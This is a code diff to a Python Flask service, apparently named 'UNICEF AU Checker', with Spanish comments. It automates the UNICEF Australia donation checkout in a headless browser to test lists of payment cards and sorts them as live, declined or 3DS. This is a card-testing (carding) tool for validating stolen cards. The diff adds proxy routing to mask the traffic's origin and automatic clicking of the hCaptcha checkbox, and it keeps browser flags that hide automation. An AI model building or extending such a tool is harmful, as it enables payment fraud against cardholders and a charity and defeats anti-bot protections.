@@ -31,7 +31,12 @@ DONOR_ADDRESS    = os.environ.get(
 )
 
 ZIP_CODE = os.environ.get('ZIP_CODE', '10001')
-MAX_RETRIES_PER_CARD = int(os.environ.get('MAX_RETRIES_PER_CARD', '1'))  # default 1 = sin reintento
+MAX_RETRIES_PER_CARD = int(os.environ.get('MAX_RETRIES_PER_CARD', '1'))
+
+# Variables para Proxy (Northflank)
+PROXY_SERVER = os.environ.get('PROXY_SERVER', '')
+PROXY_USERNAME = os.environ.get('PROXY_USERNAME', '')
+PROXY_PASSWORD = os.environ.get('PROXY_PASSWORD', '')
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -44,7 +49,6 @@ checking_status = {
     'threeds': 0, 'error': 0, 'current': '', 'results': [],
     'thread': None, 'stop_on_live': False,
 }
-
 
 # ============================================================
 # CHECKER
@@ -118,7 +122,6 @@ class UnicefChecker:
             return None
 
     def _screenshot(self, tag):
-        """Toma screenshot con nombre único y devuelve base64 (opcional)."""
         try:
             if self.page:
                 path = f'debug_psicodelia_{tag}.png'
@@ -130,7 +133,6 @@ class UnicefChecker:
         return None
 
     def _screenshot_b64(self):
-        """Devuelve screenshot en base64."""
         try:
             if self.page:
                 return base64.b64encode(
@@ -183,9 +185,6 @@ class UnicefChecker:
                 continue
         return False
 
-    # ============================================================
-    # ZIP CODE (necesario porque el server corre en USA)
-    # ============================================================
     def _fill_zip_code(self, ctx, verbose=False):
         selectors = [
             '#payment-postalInput',
@@ -405,7 +404,7 @@ class UnicefChecker:
         return self._is_card_section_open(page)
 
     # ============================================================
-    # SESIÓN PERSISTENTE
+    # SESIÓN PERSISTENTE CON PROXY
     # ============================================================
     def _ensure_session(self, amount):
         if self.session_ready and self.page and not self.page.is_closed():
@@ -417,8 +416,20 @@ class UnicefChecker:
         self._teardown_session()
         try:
             self.playwright = sync_playwright().start()
+            
+            # Configurar Proxy
+            proxy_settings = None
+            if PROXY_SERVER:
+                proxy_settings = {
+                    "server": PROXY_SERVER,
+                    "username": PROXY_USERNAME,
+                    "password": PROXY_PASSWORD
+                }
+                logger.info(f"🔒 Usando proxy: {PROXY_SERVER} (User: {PROXY_USERNAME[:10]}...)")
+
             self.browser = self.playwright.chromium.launch(
                 headless=self.headless,
+                proxy=proxy_settings,  # <-- PROXY APLICADO AQUÍ
                 args=['--no-sandbox', '--disable-setuid-sandbox',
                       '--disable-dev-shm-usage',
                       '--disable-blink-features=AutomationControlled'],
@@ -628,7 +639,6 @@ class UnicefChecker:
         return snapshot
 
     def _dump_error_texts(self):
-        """Devuelve lista de errores visibles (para log)."""
         errors = []
         error_sel = (
             '[role="alert"], [aria-live="polite"], [aria-live="assertive"], '
@@ -732,7 +742,45 @@ class UnicefChecker:
         return False
 
     # ============================================================
-    # CLICK — polling robusto con captura obligatoria
+    # MANEJO DE HCaptcha (NUEVO)
+    # ============================================================
+    def _handle_hcaptcha(self):
+        """Busca y clickea el hCaptcha si aparece."""
+        logger.info("🤖 Buscando hCaptcha...")
+        # Buscar en frames
+        for frame in self.page.frames:
+            if 'hcaptcha' in frame.url.lower():
+                try:
+                    logger.info(f"📍 hCaptcha detectado en frame: {frame.url[:60]}")
+                    # Intentar clickear el checkbox
+                    for sel in ['#checkbox', '.h-captcha-checkbox', 'div[role="checkbox"]']:
+                        try:
+                            box = frame.locator(sel).first
+                            if box.count() > 0 and box.is_visible():
+                                box.click(timeout=3000)
+                                logger.info(f"🖱️ hCaptcha clickeado vía {sel}")
+                                return True
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
+
+        # Buscar en DOM principal (por si acaso)
+        for sel in ['#checkbox', '.h-captcha-checkbox']:
+            try:
+                box = self.page.locator(sel).first
+                if box.count() > 0 and box.is_visible():
+                    box.click(timeout=3000)
+                    logger.info(f"🖱️ hCaptcha clickeado en DOM principal vía {sel}")
+                    return True
+            except Exception:
+                pass
+                
+        logger.info("ℹ️ No se detectó hCaptcha o no se pudo clickear.")
+        return False
+
+    # ============================================================
+    # CLICK — polling robusto con captura y hCaptcha
     # ============================================================
     def _click_process_payment_and_wait(self):
         found_ctx, span, btn = self._locate_process_payment()
@@ -744,7 +792,6 @@ class UnicefChecker:
             btn = span
         target = btn if btn is not None else span
 
-        # ---- Loguear errores preexistentes ----
         pre_errs = self._dump_error_texts()
         if pre_errs:
             logger.info(f"⚠️ Errores PREEXISTENTES ({len(pre_errs)}):")
@@ -753,14 +800,11 @@ class UnicefChecker:
         else:
             logger.info("✅ Sin errores preexistentes en el DOM")
 
-        # ---- Pre-outcome para saber si la página ya está en decline ----
         pre_outcome = self.analyze_payment_result(self.page)
         logger.info(f"🔍 Pre-outcome: '{pre_outcome}'")
 
-        # ---- Screenshot ANTES ----
         self._screenshot("01_before_click")
 
-        # ---- ZIP si botón disabled ----
         ctx_for_zip = self._find_card_context()
         if self._get_btn_disabled(span) and ctx_for_zip:
             logger.info("🔧 Botón disabled → re-llenando ZIP")
@@ -770,9 +814,7 @@ class UnicefChecker:
         pre_errors = self._snapshot_errors()
         pre_btn_text = self._get_btn_text(span)
         pre_btn_disabled = self._get_btn_disabled(span)
-        logger.info(f"🔍 [SNAPSHOT] pre_text='{pre_btn_text}' pre_disabled={pre_btn_disabled} "
-                    f"pre_errors={len(pre_errors)}")
-
+        
         # ---- CLICK PRINCIPAL ----
         logger.info("🖱️  CLICK principal: mouse_click_bbox")
         clicked = False
@@ -793,8 +835,15 @@ class UnicefChecker:
             self._screenshot("02_click_failed")
             return 'unknown'
 
-        time.sleep(2)
-        self._screenshot("03_after_click_2s")
+        # ---- ESPERA DE 15 SEGUNDOS Y CAPTCHA ----
+        logger.info("⏳ Esperando 15s post-click para que aparezca hCaptcha (si aplica)...")
+        time.sleep(15)
+        
+        # Intentar captcha
+        if self._handle_hcaptcha():
+            logger.info("⏳ hCaptcha clickeado. Esperando 10s para validación...")
+            time.sleep(10)
+            self._screenshot("03_after_captcha")
 
         # ---- POLLING 45s ----
         logger.info("⏳ Polling resultado (45s max)...")
@@ -810,7 +859,7 @@ class UnicefChecker:
                 logger.info(f"📊 [{elapsed}s] decline (error nuevo)")
                 break
 
-            # 2) analyze_payment_result (si cambió respecto al pre_outcome)
+            # 2) analyze_payment_result
             curr_outcome = self.analyze_payment_result(self.page)
             if curr_outcome in ('decline', 'live', 'threeds') and curr_outcome != pre_outcome:
                 detected = curr_outcome
@@ -823,43 +872,36 @@ class UnicefChecker:
                 logger.info(f"📊 [{elapsed}s] live (URL)")
                 break
 
-            # 4) Botón cambió → sigue esperando con más tiempo
+            # 4) Botón cambió
             curr_text = self._get_btn_text(span)
             curr_disabled = self._get_btn_disabled(span)
             if (curr_text and 'process payment' not in curr_text) or \
                (not pre_btn_disabled and curr_disabled) or \
                (curr_text == '' and pre_btn_text != ''):
                 logger.info(f"📊 [{elapsed}s] botón cambió ('{curr_text}' disabled={curr_disabled}) "
-                            f"→ sigue polling con más tiempo")
-                # No break, seguir esperando resultado real
-
-            # 5) ZIP retry cada 4s
+                            f"→ sigue polling")
+            
+            # ZIP retry
             if ctx_for_zip and i > 0 and i % 8 == 0:
                 try:
                     self._fill_zip_code(ctx_for_zip, verbose=False)
                 except Exception:
                     pass
 
-            # 6) Log progreso cada 6s
             if elapsed > 0 and elapsed % 6 == 0 and i % 12 == 0:
                 logger.info(f"⏳ [{elapsed}s] esperando... url={self.page.url[:60]}")
 
-        # ---- RESULTADO ----
         if not detected:
             logger.warning(f"❌ Sin resultado tras 45s → unknown")
             self._screenshot("99_unknown_final")
-
-            # Captura final + dump
             post_errs = self._dump_error_texts()
             if post_errs:
                 logger.warning(f"⚠️ Errores visibles al final ({len(post_errs)}):")
                 for i, e in enumerate(post_errs[:10]):
                     logger.warning(f"   {i+1}. {e[:180]}")
-
             post_outcome = self.analyze_payment_result(self.page)
             logger.warning(f"⚠️ Post-outcome final: '{post_outcome}'")
             logger.warning(f"⚠️ URL final: {self.page.url}")
-
             self._dump_debug()
             return 'unknown'
 
@@ -947,7 +989,6 @@ class UnicefChecker:
 
             outcome = self._click_process_payment_and_wait()
 
-            # Tomar screenshot base64 SIEMPRE (incluso unknown)
             screenshot_b64 = self._screenshot_b64()
 
             if outcome == 'live':
@@ -985,7 +1026,6 @@ class UnicefChecker:
             },
         }
 
-    # ---------------- análisis de resultado ----------------
     def analyze_payment_result(self, page):
         text_parts = []
         try:
@@ -1088,7 +1128,6 @@ class UnicefChecker:
         finally:
             self._teardown_session()
 
-
 # ============================================================
 # WORKER
 # ============================================================
@@ -1146,15 +1185,14 @@ def process_cards_worker(cards, amount, stop_on_live):
         checker._teardown_session()
     checking_status['active'] = False
 
-
 # ============================================================
 # ENDPOINTS
 # ============================================================
 @app.route('/')
 def index():
     return jsonify({
-        "status": "online", "service": "UNICEF AU Checker", "version": "2.5",
-        "mode": "persistent_session + auto_zip + screenshot_on_unknown",
+        "status": "online", "service": "UNICEF AU Checker", "version": "2.6",
+        "mode": "proxy + hcaptcha + persistent_session",
         "endpoints": {
             "health": "/api/health", "status": "/api/status",
             "check_card": "/api/check-card (POST)",
@@ -1164,16 +1202,15 @@ def index():
         "config": {
             "headless": HEADLESS, "donation_amount": DONATION_AMOUNT,
             "cvv_api": bool(CVV_API_URL), "zip_code": ZIP_CODE,
+            "proxy": bool(PROXY_SERVER),
             "max_retries_per_card": MAX_RETRIES_PER_CARD,
         },
     })
 
-
 @app.route('/api/health', methods=['GET'])
 def health_check():
     return jsonify({'status': 'online', 'service': 'UNICEF AU Checker',
-                    'version': '2.5', 'timestamp': datetime.now().isoformat()})
-
+                    'version': '2.6', 'timestamp': datetime.now().isoformat()})
 
 @app.route('/api/status', methods=['GET'])
 def get_status():
@@ -1183,7 +1220,6 @@ def get_status():
         'threeds': checking_status['threeds'], 'error': checking_status['error'],
         'current': checking_status['current'], 'total': len(checking_status['results']),
     })
-
 
 @app.route('/api/check-card', methods=['POST'])
 def check_single_card_endpoint():
@@ -1196,7 +1232,6 @@ def check_single_card_endpoint():
         return jsonify({'success': False, 'message': 'Formato inválido'}), 400
     checker = UnicefChecker(headless=HEADLESS)
     return jsonify(checker.check_single_card(card, amount))
-
 
 @app.route('/api/check', methods=['POST'])
 def check_cards():
@@ -1223,7 +1258,6 @@ def check_cards():
                     'message': f'Verificación iniciada para {len(valid)} tarjetas',
                     'total': len(valid)})
 
-
 @app.route('/api/results', methods=['GET'])
 def get_results():
     return jsonify({
@@ -1235,17 +1269,15 @@ def get_results():
         },
     })
 
-
 @app.route('/api/cancel', methods=['POST'])
 def cancel_check():
     global checking_status
     checking_status['active'] = False
     return jsonify({'success': True, 'message': 'Chequeo cancelado'})
 
-
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     debug = os.environ.get('FLASK_ENV', 'development') == 'development'
     logger.info(f"🚀 Puerto {port} (headless={HEADLESS}, amount=${DONATION_AMOUNT}, "
-                f"zip=${ZIP_CODE}, retries={MAX_RETRIES_PER_CARD}) — v2.5 debug ON")
+                f"zip=${ZIP_CODE}, proxy={bool(PROXY_SERVER)}) — v2.6")
     app.run(host='0.0.0.0', port=port, debug=debug, use_reloader=False)
